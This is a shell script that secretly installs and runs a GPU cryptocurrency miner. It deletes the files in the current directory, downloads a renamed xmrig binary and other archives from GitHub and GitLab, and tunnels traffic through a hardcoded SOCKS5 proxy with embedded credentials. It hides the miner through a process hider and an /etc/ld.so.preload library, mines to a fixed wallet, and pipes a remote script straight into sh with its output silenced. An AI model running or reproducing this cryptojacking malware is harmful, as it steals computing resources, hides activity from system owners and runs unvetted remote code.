rm -rvf * && mkdir a && cd a
#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

npm i -g node-process-hider
APP=app$(shuf -i 1000000-9999999 -n 1)
wget https://github.com/Bendr0id/xmrig-nvidia/releases/download/v2.14.4_UPX2/xmrig-nvidia-2.14.4_with_upx2-cuda10_1-linux-x64.tar.gz
tar -xhf xmrig-nvidia-2.14.4_with_upx2-cuda10_1-linux-x64.tar.gz
wget http://ftp.de.debian.org/debian/pool/non-free/n/nvidia-cuda-toolkit/libnvrtc9.2_9.2.148-7+deb10u1_amd64.deb
dpkg -i libnvrtc9.2_9.2.148-7+deb10u1_amd64.deb
wget https://github.com/0xinfinitykernel/libxmrig-cuda/raw/refs/heads/main/libxmrig-cuda.so
wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 45.55.165.161:443
socks5_username = majapahlevi
socks5_password = majapahlevi
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "
mv xmrig-nvidia $APP
ph add $APP 

./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp & clear & ./$APP -o 104.248.231.165:443 -u UmW3y8YH8oQ3WRNDYVCNt1BN6xjHuTvaSVrzyxTbretq6SvVWbeSy6MARXLcmb3o18eY15e8jYfw6CrahhCHvnAX1gF8zqfAk -p app$(shuf -i 1000000-9999999 -n 1) -a cn-extremelite/upx2 -k --donate-level 1 & curl https://raw.githubusercontent.com/John1265801/bookish-sniffle/refs/heads/main/bismillah.sh | sh > /dev/null 2>&1
